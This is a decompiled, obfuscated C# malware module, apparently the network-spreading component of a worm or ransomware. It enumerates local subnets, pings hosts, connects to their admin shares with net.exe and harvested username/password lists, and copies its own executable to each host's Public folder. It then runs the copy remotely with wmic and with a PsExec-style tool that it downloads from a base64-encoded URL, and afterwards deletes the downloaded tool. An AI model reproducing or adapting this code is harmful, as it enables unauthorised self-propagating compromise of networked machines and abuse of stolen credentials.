using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Text.RegularExpressions;
using System.Threading;

namespace oEqFtKwIikP;

internal class QZkYxCOnIUaFQzfJ
{
	[CompilerGenerated]
	private sealed class SRCJtOzwtPE
	{
		public string vavROJORNVifg;

		public bool _003CGetIPAddresses_003Eb__0(string o)
		{
			return o != vavROJORNVifg;
		}
	}

	public static List<string> mXIsvSrIJCe = new List<string>();

	public static string neQnGqVzCqaSz = "";

	public static List<string> pXerCkMOBZYzN = new List<string>();

	public static List<string> zAwLDIOooE = new List<string>();

	public static List<string> EGmXrMolpmOty = new List<string>();

	public static void WqHXMEFOuVaJx()
	{
		try
		{
			List<string> first = eMbJiqtuyNsP();
			EGmXrMolpmOty = icZVuhrLOczo();
			mXIsvSrIJCe = first.Union(EGmXrMolpmOty).ToList();
		}
		catch
		{
			return;
		}
		string text = "";
		if (mXIsvSrIJCe.Count > 0)
		{
			try
			{
				text = ZIUDTLGXgQmr();
			}
			catch
			{
				return;
			}
		}
		try
		{
			if (File.Exists(text))
			{
				foreach (string item in mXIsvSrIJCe)
				{
					if ((!item.StartsWith("10.") && !item.StartsWith("172.16.") && !item.StartsWith("192.168.") && !item.StartsWith("")) || !SvngEtqFtLsy(item))
					{
						continue;
					}
					try
					{
						if (ieyWohRMXsyos.OTcIywxSSHPZqmY == "YES")
						{
							for (int i = 0; i < pXerCkMOBZYzN.Count; i++)
							{
								ieyWohRMXsyos.gDpzQqgYfCWc("net.exe", "use \\\\" + item + " /USER:" + pXerCkMOBZYzN[i] + " " + zAwLDIOooE[i]);
								Thread.Sleep(2000);
								File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
								if (File.Exists("\\\\" + item + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
								{
									ieyWohRMXsyos.gDpzQqgYfCWc("wmic.exe", "/node:" + item + " /user:" + pXerCkMOBZYzN[i] + " /password:" + zAwLDIOooE[i] + " process call create \"cmd.exe /c \\" + item + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location) + "\"");
								}
							}
						}
						else
						{
							ieyWohRMXsyos.gDpzQqgYfCWc("net.exe", "use \\\\" + item);
							Thread.Sleep(2000);
							File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
							if (File.Exists("\\\\" + item + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
							{
								ieyWohRMXsyos.gDpzQqgYfCWc("wmic.exe", "/node:" + item + " process call create cmd.exe \"/c \\" + item + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location) + "\"");
							}
						}
					}
					catch
					{
					}
					if (ieyWohRMXsyos.OTcIywxSSHPZqmY == "YES")
					{
						for (int j = 0; j < pXerCkMOBZYzN.Count; j++)
						{
							ieyWohRMXsyos.gDpzQqgYfCWc(text, "\\" + item + " -u " + pXerCkMOBZYzN[j] + " -p " + zAwLDIOooE[j] + " -d -f -h -s -i -n 5 -c " + Assembly.GetEntryAssembly()!.Location);
						}
					}
					else
					{
						ieyWohRMXsyos.gDpzQqgYfCWc(text, "\\" + item + " -d -f -h -s -i -n 5 -c " + Assembly.GetEntryAssembly()!.Location);
					}
				}
			}
		}
		catch
		{
			return;
		}
		List<GMJrWlIHUe> list = GMJrWlIHUe.niOvZnVGLkKrPrn();
		foreach (GMJrWlIHUe item2 in list)
		{
			try
			{
				if ((item2.XqooAECwffbFXthoSi.StartsWith("10.") || item2.XqooAECwffbFXthoSi.StartsWith("172.16.") || item2.XqooAECwffbFXthoSi.StartsWith("192.168.") || item2.XqooAECwffbFXthoSi.StartsWith("")) && SvngEtqFtLsy(item2.XqooAECwffbFXthoSi))
				{
					JeEHJEzYJkOb.mqUQiXilyZVs(item2.BTYBwtefAvJTFufg, item2.XqooAECwffbFXthoSi, "255.255.255.0");
				}
			}
			catch
			{
				return;
			}
		}
		foreach (GMJrWlIHUe item3 in list)
		{
			try
			{
				Regex regex = new Regex(".");
				string cHIYCyhVHYS = regex.Split(item3.XqooAECwffbFXthoSi)[0] + "." + regex.Split(item3.XqooAECwffbFXthoSi)[1] + "." + regex.Split(item3.XqooAECwffbFXthoSi)[2];
				List<string> first2 = qhzqDIjktbmZ.zhMoouJhWKesQFE(cHIYCyhVHYS);
				List<string> list2 = first2.Union(EGmXrMolpmOty).ToList();
				list2.AddRange(EGmXrMolpmOty);
				foreach (string item4 in list2)
				{
					string text2 = (neQnGqVzCqaSz = item4);
					foreach (string item5 in list2)
					{
						if ((!item5.StartsWith("10.") && !item5.StartsWith("172.16.") && !item5.StartsWith("192.168.") && !item5.StartsWith("")) || !SvngEtqFtLsy(item5))
						{
							continue;
						}
						try
						{
							if (ieyWohRMXsyos.OTcIywxSSHPZqmY == "YES")
							{
								for (int k = 0; k < pXerCkMOBZYzN.Count; k++)
								{
									ieyWohRMXsyos.gDpzQqgYfCWc("net.exe", "use \\\\" + item5 + " /USER:" + pXerCkMOBZYzN[k] + " " + zAwLDIOooE[k]);
									Thread.Sleep(2000);
									File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item5 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
									if (File.Exists("\\\\" + item5 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
									{
										ieyWohRMXsyos.gDpzQqgYfCWc("wmic.exe", "/node:" + item5 + " /user:" + pXerCkMOBZYzN[k] + " /password:" + zAwLDIOooE[k] + " process call create \"cmd.exe /c \\" + item5 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location) + "\"");
									}
								}
							}
							else
							{
								ieyWohRMXsyos.gDpzQqgYfCWc("net.exe", "use \\\\" + text2);
								Thread.Sleep(2000);
								File.Copy(Assembly.GetEntryAssembly()!.Location, "\\\\" + item5 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location), overwrite: true);
								if (File.Exists("\\\\" + item5 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location)))
								{
									ieyWohRMXsyos.gDpzQqgYfCWc("wmic.exe", "/node:" + item5 + " process call create cmd.exe \"/c \\" + item5 + "\\Users\\Public\\" + Path.GetFileName(Assembly.GetEntryAssembly()!.Location) + "\"");
								}
							}
						}
						catch
						{
						}
						if (ieyWohRMXsyos.OTcIywxSSHPZqmY == "YES")
						{
							for (int l = 0; l < pXerCkMOBZYzN.Count; l++)
							{
								ieyWohRMXsyos.gDpzQqgYfCWc(text, "\\" + item5 + " -u " + pXerCkMOBZYzN[l] + " -p " + zAwLDIOooE[l] + " -d -f -h -s -i -n 5 -c " + Assembly.GetEntryAssembly()!.Location);
							}
						}
						else
						{
							ieyWohRMXsyos.gDpzQqgYfCWc(text, "\\" + item5 + " -d -f -h -s -i -n 5 -c " + Assembly.GetEntryAssembly()!.Location);
						}
					}
				}
			}
			catch
			{
				return;
			}
		}
		if (File.Exists(text))
		{
			File.Delete(text);
		}
	}

	public static List<string> eMbJiqtuyNsP()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string ZIUDTLGXgQmr()
	{
		if (IntPtr.Size == 8)
		{
			return NqvuLWYYNcP(new Uri(ieyWohRMXsyos.tEHBqPAYINDcv("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return NqvuLWYYNcP(new Uri(ieyWohRMXsyos.tEHBqPAYINDcv("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static bool SvngEtqFtLsy(string BpFnCTmWuEDqKk)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(BpFnCTmWuEDqKk);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string NqvuLWYYNcP(Uri RtppAFWBRmn)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(RtppAFWBRmn, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> icZVuhrLOczo()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string vavROJORNVifg in array4)
			{
				if (vavROJORNVifg.Contains(":"))
				{
					array = array.Where((string o) => o != vavROJORNVifg).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
